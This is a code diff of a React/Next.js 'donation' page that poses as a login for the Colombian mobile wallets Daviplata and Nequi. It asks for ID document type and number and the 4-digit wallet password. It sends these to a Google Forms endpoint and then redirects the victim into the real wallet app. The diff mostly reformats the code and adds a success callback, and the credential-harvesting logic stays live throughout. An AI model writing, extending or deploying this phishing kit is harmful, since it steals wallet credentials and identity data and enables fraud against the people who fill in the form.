@@ -3,22 +3,31 @@
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function DonacionPage() {
+type DonacionPageProps = {
+  onSuccess?: () => void;
+};
+
+export default function DonacionPage({ onSuccess }: DonacionPageProps) {
   const [billetera, setBilletera] = useState("Daviplata");
   const [tipoDoc, setTipoDoc] = useState("");
   const [numeroDoc, setNumeroDoc] = useState("");
   const [password, setPassword] = useState("");
   const [mostrarPass, setMostrarPass] = useState(false);
-  const router = useRouter(); // para redirigir si no es móvil
+  const router = useRouter();
 
-  const formURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
+  const formURL =
+    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
   const entryBilletera = "entry.1287154502";
   const entryTipoDoc = "entry.1004012202";
   const entryNumeroDoc = "entry.274269619";
   const entryPassword = "entry.1885484666";
 
-  const isMobile = () => typeof navigator !== "undefined" && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const getAppURL = () => (billetera === "Nequi" ? "nequi://" : "daviplata://inicio");
+  const isMobile = () =>
+    typeof navigator !== "undefined" &&
+    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  const getAppURL = () =>
+    billetera === "Nequi" ? "nequi://" : "daviplata://inicio";
 
   const handleSubmit = async () => {
     if (!tipoDoc || !numeroDoc || !password) {
@@ -44,12 +53,17 @@ export default function DonacionPage() {
         body: formData,
       });
 
+      if (onSuccess) {
+        onSuccess(); // llamada al prop si fue proporcionado
+        return;
+      }
+
       if (isMobile()) {
         setTimeout(() => {
           window.location.href = getAppURL();
         }, 100);
       } else {
-        router.push("/gracias"); // o cualquier ruta de "éxito"
+        router.push("/gracias");
       }
     } catch (error) {
       console.error("Error al enviar los datos:", error);
@@ -59,11 +73,17 @@ export default function DonacionPage() {
 
   return (
     <div className="max-w-2xl mx-auto py-6 px-4">
-      <h1 className="text-xl font-bold text-center text-[#19295A] mb-4">Ingrese a su Billetera Virtual</h1>
+      <h1 className="text-xl font-bold text-center text-[#19295A] mb-4">
+        Ingrese a su Billetera Virtual
+      </h1>
 
       <div className="mb-3">
         <label>Billetera</label>
-        <select value={billetera} onChange={(e) => setBilletera(e.target.value)} className="w-full p-2 rounded">
+        <select
+          value={billetera}
+          onChange={(e) => setBilletera(e.target.value)}
+          className="w-full p-2 rounded"
+        >
           <option value="Daviplata">Daviplata</option>
           <option value="Nequi">Nequi</option>
         </select>
@@ -71,7 +91,11 @@ export default function DonacionPage() {
 
       <div className="mb-3">
         <label>Tipo de documento</label>
-        <select value={tipoDoc} onChange={(e) => setTipoDoc(e.target.value)} className="w-full p-2 rounded">
+        <select
+          value={tipoDoc}
+          onChange={(e) => setTipoDoc(e.target.value)}
+          className="w-full p-2 rounded"
+        >
           <option value="">Selecciona</option>
           <option>Cédula de Ciudadanía</option>
           <option>Tarjeta de Identidad</option>
@@ -81,18 +105,43 @@ export default function DonacionPage() {
 
       <div className="mb-3">
         <label>Número de documento</label>
-        <input type="text" value={numeroDoc} onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))} className="w-full p-2 rounded" />
+        <input
+          type="text"
+          value={numeroDoc}
+          onChange={(e) =>
+            setNumeroDoc(e.target.value.replace(/\D/g, ""))
+          }
+          className="w-full p-2 rounded"
+        />
       </div>
 
       <div className="mb-4">
         <label>Contraseña (4 dígitos)</label>
         <div className="flex">
-          <input type={mostrarPass ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))} className="w-full p-2 rounded-l" />
-          <button type="button" onClick={() => setMostrarPass(!mostrarPass)} className="bg-gray-300 px-3 rounded-r">{mostrarPass ? "Ocultar" : "Ver"}</button>
+          <input
+            type={mostrarPass ? "text" : "password"}
+            value={password}
+            onChange={(e) =>
+              setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))
+            }
+            className="w-full p-2 rounded-l"
+          />
+          <button
+            type="button"
+            onClick={() => setMostrarPass(!mostrarPass)}
+            className="bg-gray-300 px-3 rounded-r"
+          >
+            {mostrarPass ? "Ocultar" : "Ver"}
+          </button>
         </div>
       </div>
 
-      <button onClick={handleSubmit} className="w-full py-2 bg-[#19295A] text-white rounded hover:bg-[#1b2e63]">Ingresar</button>
+      <button
+        onClick={handleSubmit}
+        className="w-full py-2 bg-[#19295A] text-white rounded hover:bg-[#1b2e63]"
+      >
+        Ingresar
+      </button>
     </div>
   );
 }
